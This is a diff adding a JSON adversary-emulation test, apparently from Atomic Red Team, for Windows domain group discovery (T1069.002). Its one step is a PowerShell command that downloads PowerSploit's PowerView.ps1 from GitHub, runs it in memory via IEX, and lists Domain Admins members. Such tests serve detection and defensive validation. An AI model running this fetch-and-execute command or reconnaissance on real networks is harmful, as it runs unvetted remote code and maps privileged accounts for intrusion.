@@ -1,0 +1,23 @@
+{
+  "id": "46352f40-f283-4fe5-b56d-d9a71750e145",
+  "name": "Get-DomainGroupMember with PowerView",
+  "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "760d720b-b502-484c-9f02-22a09de563de",
+      "type": "execute-command",
+      "data": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1069.002",
+    "atomic-red-team"
+  ]
+}
